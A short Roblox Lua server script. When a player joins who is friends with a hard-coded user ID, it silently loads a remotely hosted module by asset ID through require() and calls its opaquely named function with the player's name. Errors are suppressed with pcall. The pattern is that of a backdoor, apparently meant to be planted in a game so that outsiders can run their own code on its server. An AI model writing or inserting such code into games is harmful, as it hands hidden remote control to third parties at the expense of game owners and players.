local Players = game:GetService("Players")

local FRIEND_USER_ID = 1820992590
local MODULE_ID = 90193486541655

Players.PlayerAdded:Connect(function(plr)
	-- Verifica se é amigo com segurança
	local success, isFriend = pcall(function()
		return plr:IsFriendsWith(1820992590)
	end)

	if success and isFriend then
		pcall(function()
			require(90193486541655).idk(plr.Name)
		end)
	end
end)
